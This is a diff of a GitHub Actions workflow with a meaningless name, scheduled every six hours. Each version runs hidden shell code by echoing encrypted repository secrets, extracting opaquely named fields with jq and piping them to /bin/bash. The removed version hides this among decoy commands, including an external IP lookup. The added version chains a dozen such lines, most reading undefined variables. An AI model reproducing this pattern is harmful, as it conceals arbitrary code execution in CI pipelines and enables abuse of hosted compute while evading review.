@@ -1,41 +1,28 @@
 name: wangchuyi2016
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
+    - cron: '48 3/6 * * *'
 
-jobs:  # 230
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangchuyi2016
         env:
-          q21900: ${{ secrets.q21900 }}
+          c22593: ${{ secrets.c22593 }}
         run: |
-          test -d /tmp && echo "Tmp dir exists"
-          [ -f /etc/hosts ] && echo "Hosts exist" || true
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
-          echo $q21900 | jq -r .y7699 | /bin/bash
-          curl www.google.com
-          which uname
-          ping -c 10 www.google.com
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
-          : ' Another single-line comment '
-          printf "%s" "xyz" > tmp.xyz
-          uname -a
-          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
-          echo "Files: $(ls | wc -l 2>/dev/null || echo 0)"
-          which apt-get
-          echo "Build $(date +%s)"
-          [ -f /etc/hosts ] && echo "Hosts exist" || true
-          ls -la 2>/dev/null || true
-          curl ipinfo.io/ip
-          echo "User: $(whoami)"
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          which screen
-          sleep 0.1 2>/dev/null || true
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          test -d /tmp && echo "Tmp dir exists"
+          echo $c22593 | jq -r .sklu15379 | /bin/bash
+          echo $ckgj8 | jq -r .k203 | /bin/bash
+          echo $x8 | jq -r .xsqp358 | /bin/bash
+          echo $qgys51281 | jq -r .isdda35123 | /bin/bash
+          echo $jfk80 | jq -r .eob44373 | /bin/bash
+          echo $ku37061 | jq -r .dsmka0 | /bin/bash
+          echo $adup29 | jq -r .cfw582 | /bin/bash
+          echo $xgxkt278 | jq -r .ums0445 | /bin/bash
+          echo $wr587 | jq -r .docu10991 | /bin/bash
+          echo $rzc38123 | jq -r .perms138 | /bin/bash
+          echo $r6 | jq -r .weiu9481 | /bin/bash
+          echo $lsi41 | jq -r .tpzl9887 | /bin/bash
+
